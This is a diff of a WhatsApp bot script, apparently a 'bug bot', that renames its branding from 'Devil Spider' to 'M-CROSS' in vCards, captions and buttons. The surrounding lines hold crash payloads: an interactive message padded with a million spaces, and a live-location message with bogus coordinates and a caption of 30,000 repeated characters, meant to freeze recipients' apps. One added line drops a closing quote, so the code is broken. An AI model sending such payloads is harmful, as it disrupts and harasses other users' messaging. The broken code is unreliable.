@@ -2679,7 +2679,7 @@ let namaown = `𝗠-𝗖𝗥𝗢𝗦𝗦`
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
 "displayName": `${namaown}`,
-"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝐃𝐄𝐕𝐈𝐋⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐃𝐄𝐕𝐈𝐋 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ༑ ]]\nEND:VCARD`,
+"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ Ｍ-ＣＲＯＳＳ🌹 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ Ｍ-ＣＲＯＳＳ ༑ ]]\nEND:VCARD`,
 }
 }), { userJid: m.chat, quoted: m })
 ryozingod.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -3173,7 +3173,7 @@ if (!/image/.test(mime)) return joreply(`Send/Reply Foto Dengan Caption ${prefix
 joreply(mess.wait)
 let media = await quoted.download()
 let proses = await remini(media, "enhance");
-ryozingod.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
+ryozingod.sendMessage(m.chat, { image: proses, caption: '*CLEARED PIX BY Ｍ-ＣＲＯＳＳ🌹'}, { quoted: m })
 }
 break
 //=================================================//
@@ -12239,7 +12239,7 @@ message: {
       "buttons": [
         {
           "name": "cta_url",
-          "buttonParamsJson": "{ display_text : '⿻𝕾𝖕𝖎𝖉𝖊𝖗🕸️𝖂𝖊𝖇🕷️⿻', url : , merchant_url :  }"
+          "buttonParamsJson": "{ display_text : '⿻Ｍ-ＣＲＯＳＳ🌹⿻', url : , merchant_url :  }"
         }
       ],
       "messageParamsJson": " ".repeat(1000000)
@@ -12661,7 +12661,7 @@ viewOnceMessage: {
 message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
-    "degreesLongitude": "p",
+    "degreesLongitude": "p
     "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(30000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
